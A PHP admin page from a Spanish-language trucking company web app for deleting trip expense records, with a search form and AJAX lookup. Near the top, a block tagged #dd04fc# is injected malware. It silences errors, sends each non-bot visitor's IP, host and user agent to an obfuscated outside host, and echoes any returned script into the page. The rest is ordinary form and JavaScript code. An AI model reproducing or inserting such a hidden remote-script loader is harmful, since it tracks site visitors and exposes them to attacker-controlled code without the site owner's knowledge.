<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}		
	include("../conexion/ajax.php");	
?>
<?php
#dd04fc#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/dd04fc#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function eliminar()
	{
		//agregarCargando('cargando');
		codigo = document.getElementById("textCodigo").value;
		//alert("eliminar" + codigo);
		if(dni.length==0)
		{
			alert("¡ Debes buscar primero un Pago !");
			//quitarCargando('cargando');
			return;
		}
		//quitarCargando('cargando');
		document.getElementById("form1").submit();
		
	}
	
	function buscar()
	{
		//agregarCargando('cargando');
		codigo = document.getElementById("textCodigo").value;
		if(codigo.length==0)
		{
			alert("¡ Debes ingresar un CODIGO !");
			quitarCargando('cargando');
			return;
		}
		_obj = crearObjeto();			
		_url = "ajaxManejador.php";
		_valores = "op=buscarGastos&clave="+codigo;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			if(_obj.readyState==4)
			{
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					//alert(resp);
					resp = resp.split("*");	
					//alert(resp[2]);	
					if(resp[0]=="not_found")
					{
						alert("¡ No existe Pago registrado con tal CODIGO !");
						document.getElementById("textCodigo").value = "";	
						document.getElementById("txtDescripcion").innerHTML = "";
						document.getElementById("txtFecha").innerHTML = "";
						document.getElementById("txtMonto").innerHTML = "";	
						document.getElementById("txtTipo").innerHTML = "";	
						document.getElementById("txtRazonS").innerHTML = "";	
						document.getElementById("txtNroComp").innerHTML = "";	
						document.getElementById("txtPrecioGalon").innerHTML = "";
						document.getElementById("txtNroGalones").innerHTML = "";													
					}
					else
					{
						//alert(resp[1]);
						document.getElementById("txtDescripcion").innerHTML = resp[0];
						document.getElementById("txtFecha").value = resp[1];
						document.getElementById("txtMonto").value = resp[2];	
						document.getElementById("txtTipo").value = resp[3];	
						document.getElementById("txtRazonS").value = resp[4];	
						document.getElementById("txtNroComp").value = resp[5];	
						document.getElementById("txtPrecioGalon").value = resp[6];	
						document.getElementById("txtNroGalones").value = resp[7];	
					}
					quitarCargando('cargando');
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - Eliminar Pagos del Viaje ::</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142">
		<form id="form1" name="form1" method="post" action="admin.php">
          <table width="369" border="0" align="center">
            <tr>
              <th height="58" colspan="3" scope="col">ELIMINAR GASTOS DE VIAJE </th>
              </tr>
            <tr>
              <td width="115" height="34"><em><strong>Codigo:</strong></em></td>
              <td width="168">
                <input name="textCodigo" type="text" id="textCodigo" maxlength="8" />                </td>
              <td width="64">&nbsp;</td>
            </tr>
            <tr>
              <td height="37">&nbsp;</td>
              <td><label>
                <input name="Buscar" type="button" id="Buscar" value="Buscar" onClick="buscar()" />
              </label></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="32"><em><strong>Descripcion:</strong></em></td>
              <td><div align="justify">
                <textarea name="txtDescripcion" id="txtDescripcion"></textarea>
              </div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Fecha:</strong></em></td>
              <td><div align="justify">
                <input name="txtFecha" type="text" id="txtFecha" />
              </div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Monto:</strong></em></td>
              <td><div align="justify">
                <input name="txtMonto" type="text" id="txtMonto" />
              </div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Tipo:</strong></em></td>
              <td><input name="txtTipo" type="text" id="txtTipo" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>RazonSocial:</strong></em></td>
              <td><input name="txtRazonS" type="text" id="txtRazonS" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>N&deg; Comprobante: </strong></em></td>
              <td><input name="txtNroComp" type="text" id="txtNroComp" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Precio Galon:</strong></em></td>
              <td><input name="txtPrecioGalon" type="text" id="txtPrecioGalon" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>N&deg; Galones: </strong></em></td>
              <td><input name="txtNroGalones" type="text" id="txtNroGalones" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td colspan="3">&nbsp;</td>
              </tr>
            <tr>
              <td><label>
                <div align="center">
                  <input type="submit" name="Submit" value="Eliminar" />
                </div>
              </label></td>
              <td colspan="2"><label>
                <div align="center">
                  <input name="Cancelar" type="button" id="Cancelar" value="Cancelar" onClick="go()" />
                  <label>
                  <input name="op" type="hidden" id="op" value="eliminarGastosViaje" />
                  </label>
                </div>
              </label></td>
              </tr>
          </table>
                <p>&nbsp;</p>
        </form>
        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>